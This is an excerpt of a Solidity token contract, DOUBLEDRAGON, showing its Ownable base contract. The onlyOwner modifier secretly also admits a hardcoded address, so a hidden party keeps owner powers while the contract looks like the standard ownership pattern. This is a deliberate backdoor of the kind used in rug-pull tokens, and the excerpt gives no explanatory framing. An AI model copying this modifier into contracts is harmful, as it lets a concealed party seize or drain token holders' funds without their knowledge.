...
abstract contract Ownable is Context {
     ...
     */
       modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xdAaeB7bDE4834089785341b1D0A2263d26188888) , "Ownable: caller is not the owner");
        _;
    }
...
contract DOUBLEDRAGON is IERC20, Ownable {
